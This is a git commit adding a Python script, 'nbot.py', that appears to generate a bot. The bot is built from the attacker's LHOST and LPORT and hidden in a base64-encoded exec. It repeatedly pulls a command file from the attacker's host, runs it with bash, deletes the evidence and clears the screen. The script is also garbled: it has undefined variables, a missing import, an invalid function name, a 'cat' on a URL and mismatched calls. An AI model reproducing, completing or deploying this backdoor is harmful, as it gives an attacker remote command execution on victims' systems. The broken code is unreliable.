98063ce078531ec53a1505bac75ed895a6150172
Guille-ux <104579306+Guille-ux@users.noreply.github.com>
2022-07-11 17:22:04 +0200

    little finished

---
+++ nbot.py
@@ -0,0 +1,25 @@
+import os, time
+
+time.sleep(0.5)
+opt = input("LHOST: ")
+opt2 = input("LPORT: ")
+opt3 = input("name: ")
+op = open(name + ".py", "w")
+cod = base64.b64encode("""import os, time
+
+os.system("python3 -m http.server 8080 &")
+def get-put(ip):
+	os.system("cat http://{}:{}/data.txt >> data.sh".format(ip))
+	time.sleep(0.5)
+	os.system("bash data.sh > data")
+	os.remove("data.sh")
+	time.sleep(1.5)
+	os.remove("data")
+	os.system("clear")
+while True:
+	get(ip)""".format(opt, opt2))
+op1 = op.write("""import os
+import base64
+import time
+
+exec(base64.b64decode(cod))""")
